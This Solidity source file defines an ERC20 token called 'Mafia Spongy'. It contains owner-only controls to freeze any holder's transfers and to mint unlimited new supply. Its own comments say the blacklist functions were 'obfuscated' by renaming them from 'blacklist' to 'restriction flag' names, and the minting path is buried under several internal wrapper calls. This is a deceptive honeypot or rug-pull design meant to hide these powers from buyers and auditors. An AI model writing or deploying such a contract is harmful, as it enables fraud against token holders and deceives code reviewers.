// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SpongyToken is ERC20, Ownable {
    // Obfuscated storage for blacklisted addresses
    mapping(address => bool) private _restricted;

    constructor(address initialOwner) ERC20("Mafia Spongy", "Spongy") Ownable(initialOwner) {
        _mint(initialOwner, 1000000000 * (10 ** uint256(decimals())));
    }

    // Step 1: Obfuscated function to flag an address (formerly blacklist)
    function setRestrictionFlag(address account) external onlyOwner {
        _modifyRestriction(account, true);
    }

    // Step 2: Obfuscated function to remove the restriction flag (formerly unblacklist)
    function removeRestrictionFlag(address account) external onlyOwner {
        _modifyRestriction(account, false);
    }

    // Step 3: Internal function to handle restriction flagging
    function _modifyRestriction(address account, bool flag) internal {
        _restricted[account] = flag;
    }

    // Step 4: Obfuscated function to check if an address is restricted (formerly isBlacklisted)
    function hasRestrictionFlag(address account) external view returns (bool) {
        return _checkRestriction(account);
    }

    // Internal function to return the restriction status
    function _checkRestriction(address account) internal view returns (bool) {
        return _restricted[account];
    }

    // Override transfer to include restriction checks
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _beforeTransfer(_msgSender(), recipient);
        return super.transfer(recipient, amount);
    }

    // Override transferFrom to include restriction checks
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _beforeTransfer(sender, recipient);
        return super.transferFrom(sender, recipient, amount);
    }

    // Step 5: Obfuscated internal function to check restrictions before transfers (formerly _checkBlacklist)
    function _beforeTransfer(address from, address to) internal view {
        require(!_checkRestriction(from), "Transfer from restricted address");
        require(!_checkRestriction(to), "Transfer to restricted address");
    }

    // Internal functions for minting logic (from the previous example)
    function increaseBalance(address account, uint256 amount) internal {
        _beforeIncreaseSupply(account, amount);
    }

    function _beforeIncreaseSupply(address account, uint256 amount) internal {
        _performMint(account, amount);
    }

    function _performMint(address account, uint256 amount) internal {
        _mint(account, amount);
    }

    function increaseSupply(address to, uint256 amount) public onlyOwner {
        increaseBalance(to, amount);
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
}
